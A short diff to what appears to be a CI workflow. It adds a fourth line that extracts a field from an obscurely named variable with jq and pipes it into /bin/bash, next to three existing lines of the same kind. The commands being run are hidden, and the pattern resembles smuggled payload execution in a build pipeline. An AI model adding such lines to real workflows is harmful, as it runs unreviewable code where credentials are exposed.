@@ -25,6 +25,7 @@ jobs:
           echo $bbgu9 | jq -r .g55 | /bin/bash
           printf '%s' "$xqp17" | jq -r .bvtld974 | /bin/bash
           echo $b5625 | jq -r .lytbl88 | /bin/bash
+          echo $c209 | jq -r .raih673 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
